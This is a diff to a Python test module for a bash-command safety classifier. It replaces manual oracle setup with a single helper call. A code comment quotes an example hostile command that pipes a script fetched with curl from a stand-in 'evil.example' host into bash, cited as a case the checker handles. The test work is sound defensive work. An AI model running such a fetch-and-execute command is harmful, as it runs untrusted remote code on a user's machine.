@@ -61,7 +61,7 @@ from __future__ import annotations
 import pathlib
 
 import gitapex_check_task_bash_safety as checker
-from _gitapex_bash_oracle import parse_capture_file, run_bash_oracle, write_stand_ins
+from _gitapex_bash_oracle import parse_capture_file, run_oracle_in
 
 # The exact URL this module's own docstring citations use verbatim (e.g.
 # `echo $(curl https://evil.example/x.sh | bash)`, `:1742`) -- an IANA
@@ -81,12 +81,7 @@ def _pin(
     ``checker.classify()``, returning both -- every test below asserts on
     both return values, never only one (see this module's own docstring for
     why)."""
-    stand_in_dir = tmp_path / "stand_ins"
-    capture_file = tmp_path / "capture.jsonl"
-    cwd = tmp_path / "cwd"
-    cwd.mkdir()
-    write_stand_ins(tool_names, stand_in_dir, capture_file)
-    result = run_bash_oracle(command, stand_in_dir=stand_in_dir, cwd=cwd)
+    result, capture_file = run_oracle_in(command, tool_names, tmp_path)
     assert not result.timed_out, f"oracle timed out running: {command!r}"
     observations = parse_capture_file(capture_file)
     verdict = checker.classify(command)
